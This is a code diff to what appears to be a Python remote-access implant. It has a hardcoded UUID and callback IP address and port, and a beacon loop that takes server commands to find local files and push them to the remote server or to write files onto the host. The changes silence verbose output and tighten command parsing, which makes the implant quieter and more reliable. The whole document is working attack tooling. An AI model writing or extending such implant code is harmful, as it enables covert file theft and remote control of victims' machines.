@@ -13,7 +13,7 @@ UUID = "ea4iFScQxHoSYMnztWhFyhVNOe5oZgeT"
 remote_ip = '134.209.206.142'
 remote_port = 8081
 server_sni_hostname = ''
-VERBOSE = True
+VERBOSE = False
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL_DEFAULT = 10    #in seconds
 BEACON_INTERVAL_MEM = None
@@ -241,7 +241,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             beacon(conn, data)
         elif "[UUID]" in data:
             push_uuid(conn)
-        elif "get" in data:  #find file locally then push to remote server
+        elif "[get]" in data:  #find file locally then push to remote server
             if VERBOSE:
                 print_info("Received GET")
             file_name = data.split()[1]
@@ -250,7 +250,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             else:
                 send_data(conn, "FILE_NOT_FOUND")
             data = ""
-        elif "put" in data:
+        elif "[put]" in data:
             if VERBOSE:
                 print_info("Received PUT")
             file_name = data.split()[2]
